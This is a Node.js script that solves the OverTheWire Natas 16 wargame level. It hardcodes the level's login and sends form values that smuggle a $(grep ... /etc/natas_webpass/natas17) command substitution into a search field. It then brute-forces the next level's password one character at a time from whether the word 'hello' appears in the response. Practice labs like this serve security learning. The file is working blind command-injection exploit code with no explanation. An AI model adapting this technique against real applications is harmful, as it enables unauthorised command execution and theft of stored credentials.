var request = require('request');
var compose = require('async').compose;

var regx = /hello/;

function range(start,stop) {
  var result=[];
  for (var idx=start.charCodeAt(0),end=stop.charCodeAt(0); idx <=end; ++idx){
    result.push(String.fromCharCode(idx));
  }
  return result;
}
var alphaNumeric = range('a', 'z').concat(range('A', 'Z'), range('0', '9'));

function doRequest(index, character, password, callback) {
  var cb = function responseCB(error, response, body) {
    if (!error && response.statusCode === 200) {
      if (!regx.test(body)) {
        password += character;
        console.log(password);
      }
      callback(null, password);
    }
  };

  var r = request.post('http://natas16.natas.labs.overthewire.org/', {
    'auth': {
      'user': 'natas16',
      'pass': 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
    }
  }, cb);

  var command = '$(grep -E ^' + password + character + '.* /etc/natas_webpass/natas17)hello';
  var form = r.form();
  form.append('needle', command);
}

function main() {
  var funcs = [];
  for (var i=0, l=32; i<l; i+=1) {
    for (var j=0, alpha=alphaNumeric.length; j<alpha; j+=1) {
      funcs.push(doRequest.bind(this, i, alphaNumeric[j]));
    }
  }
  fns = compose.apply(null, funcs.reverse());
  fns('', function(err, result) {
    console.log(result);
  });

}
main();